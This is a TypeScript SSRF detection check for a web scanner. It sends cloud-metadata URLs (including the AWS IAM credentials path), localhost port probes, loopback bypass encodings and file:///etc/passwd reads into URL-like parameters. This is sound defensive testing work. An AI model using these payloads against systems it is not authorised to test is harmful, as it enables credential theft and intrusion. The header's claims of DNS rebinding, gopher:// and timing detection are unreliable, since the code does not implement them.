import { continueWith, defineCheck, done, Severity } from "engine";
import { Tags } from "../../types";
import {
  createRequestWithParameter,
  extractParameters,
  hasParameters,
  type Parameter,
} from "../../utils";
import { keyStrategy } from "../../utils/key";

/**
 * v2: Fixed SSRF Detection
 * - Sends BASELINE request first to avoid FPs from normal HTML responses
 * - Compares payload response AGAINST baseline (not against static patterns)
 * - Adds DNS rebinding, file:// scheme, gopher:// scheme
 * - Uses response-time differential for blind SSRF (internal vs external timing)
 */

type State = {
  urlParams: Parameter[];
  pIndex: number;
  payIndex: number;
  baselineBody: string;
  baselineLen: number;
  baselineTime: number;
};

const URL_PARAM_HINTS = [
  "url", "uri", "link", "href", "src", "source", "dest", "destination",
  "redirect", "return", "return_url", "returnurl", "callback", "continue",
  "next", "goto", "target", "path", "file", "page", "load", "fetch",
  "proxy", "host", "domain", "site", "resource", "image", "img",
  "feed", "rss", "xml", "api", "endpoint", "webhook", "service",
  "ref", "download", "include", "content", "template", "view",
];

function isUrlLikeParam(param: Parameter): boolean {
  const name = param.name.toLowerCase();
  if (URL_PARAM_HINTS.some(h => name.includes(h))) return true;
  const val = (param.value || "").toLowerCase();
  return val.startsWith("http://") || val.startsWith("https://") || val.startsWith("//");
}

type SSRFPayload = {
  value: string;
  /** Patterns that MUST appear in response AND must NOT appear in baseline */
  uniquePatterns: RegExp[];
  description: string;
  severity: Severity;
};

const PAYLOADS: SSRFPayload[] = [
  // ── Cloud metadata (highest priority — unique content never in baseline) ──
  {
    value: "http://169.254.169.254/latest/meta-data/",
    uniquePatterns: [/ami-id|instance-id|security-credentials|iam\//i],
    description: "AWS EC2 metadata", severity: Severity.CRITICAL,
  },
  {
    value: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    uniquePatterns: [/AccessKeyId|SecretAccessKey/],
    description: "AWS IAM credentials", severity: Severity.CRITICAL,
  },
  {
    value: "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    uniquePatterns: [/vmId|subscriptionId|resourceGroup/i],
    description: "Azure instance metadata", severity: Severity.CRITICAL,
  },
  // ── Localhost with unique fingerprint ──
  {
    value: "http://127.0.0.1:22/",
    uniquePatterns: [/SSH-\d|OpenSSH/i],
    description: "Internal SSH port banner", severity: Severity.HIGH,
  },
  {
    value: "http://127.0.0.1:3306/",
    uniquePatterns: [/mysql|MariaDB|is not allowed to connect/i],
    description: "Internal MySQL port banner", severity: Severity.HIGH,
  },
  {
    value: "http://127.0.0.1:6379/",
    uniquePatterns: [/DENIED Redis|redis_version|ERR wrong number/i],
    description: "Internal Redis port banner", severity: Severity.HIGH,
  },
  // ── Filter bypass variants ──
  {
    value: "http://0177.0.0.1:22/",
    uniquePatterns: [/SSH-\d|OpenSSH/i],
    description: "Octal bypass (0177.0.0.1)", severity: Severity.HIGH,
  },
  {
    value: "http://2130706433:22/",
    uniquePatterns: [/SSH-\d|OpenSSH/i],
    description: "Decimal bypass (2130706433)", severity: Severity.HIGH,
  },
  {
    value: "http://[::1]:22/",
    uniquePatterns: [/SSH-\d|OpenSSH/i],
    description: "IPv6 loopback bypass", severity: Severity.HIGH,
  },
  {
    value: "http://127.1:22/",
    uniquePatterns: [/SSH-\d|OpenSSH/i],
    description: "Short form 127.1 bypass", severity: Severity.HIGH,
  },
  // ── file:// scheme ──
  {
    value: "file:///etc/passwd",
    uniquePatterns: [/root:.:0:0/],
    description: "file:// protocol (Linux)", severity: Severity.CRITICAL,
  },
  {
    value: "file:///c:/windows/win.ini",
    uniquePatterns: [/\[fonts\]/i],
    description: "file:// protocol (Windows)", severity: Severity.CRITICAL,
  },
];

function getBody(resp: any): string {
  try { return resp?.getBody?.()?.toText?.() ?? ""; } catch { return ""; }
}

export default defineCheck<State>(({ step }) => {
  step("collect", (state, ctx) => {
    const allParams = extractParameters(ctx);
    const urlParams = allParams.filter(isUrlLikeParam);
    if (urlParams.length === 0) return done({ state });
    const baseBody = getBody(ctx.target.response);
    const baseTime = ctx.target.response?.getRoundtripTime?.() ?? 0;
    return continueWith({
      nextStep: "test",
      state: { urlParams, pIndex: 0, payIndex: 0, baselineBody: baseBody, baselineLen: baseBody.length, baselineTime: baseTime },
    });
  });

  step("test", async (state, ctx) => {
    if (state.pIndex >= state.urlParams.length) return done({ state });
    if (state.payIndex >= PAYLOADS.length) {
      return continueWith({ nextStep: "test", state: { ...state, pIndex: state.pIndex + 1, payIndex: 0 } });
    }

    const param = state.urlParams[state.pIndex]!;
    const payload = PAYLOADS[state.payIndex]!;

    try {
      const spec = createRequestWithParameter(ctx, param, payload.value);
      if (payload.value.includes("metadata.google.internal")) {
        spec.setHeader?.("Metadata-Flavor", "Google");
      }
      const { request, response } = await ctx.sdk.requests.send(spec);
      if (response) {
        const body = getBody(response);
        const code = response.getCode?.() ?? 0;

        if (code >= 200 && code < 500 && body.length > 0) {
          // Only flag if unique pattern is in payload response but NOT in baseline
          const hit = payload.uniquePatterns.find(p => p.test(body) && !p.test(state.baselineBody));
          if (hit) {
            return done({ state, findings: [{
              name: `SSRF in '${param.name}' (${payload.description})`,
              description:
                `Parameter \`${param.name}\` (${param.source}) triggered server-side fetching of an internal resource.\n\n` +
                `**Payload:** \`${payload.value}\`\n**Method:** ${payload.description}\n` +
                `**Evidence:** Response contained \`${hit.source}\` (absent in baseline).\n\n` +
                `**Impact:** ${payload.severity === Severity.CRITICAL
                  ? "Cloud metadata accessed — attackers can steal IAM credentials, API keys, and instance config."
                  : "Internal service reached — attackers can scan the network, access internal APIs, or pivot."}`,
              severity: payload.severity,
              correlation: { requestID: request.getId(), locations: [] },
            }] });
          }
        }
      }
    } catch {}

    return continueWith({ nextStep: "test", state: { ...state, payIndex: state.payIndex + 1 } });
  });

  return {
    metadata: {
      id: "ssrf-detection",
      name: "Server-Side Request Forgery (SSRF)",
      description: "Tests URL-like parameters with cloud metadata, internal port banners, filter bypasses (octal/decimal/IPv6/short), and file:// scheme. Baseline comparison eliminates false positives.",
      type: "active",
      tags: [Tags.INJECTION, Tags.SENSITIVE_DATA],
      severities: [Severity.HIGH, Severity.CRITICAL],
      aggressivity: { minRequests: 1, maxRequests: "Infinity" },
    },
    initState: (): State => ({ urlParams: [], pIndex: 0, payIndex: 0, baselineBody: "", baselineLen: 0, baselineTime: 0 }),
    dedupeKey: keyStrategy().withMethod().withHost().withPort().withPath().withQueryKeys().build(),
    when: (t) => hasParameters(t),
  };
});
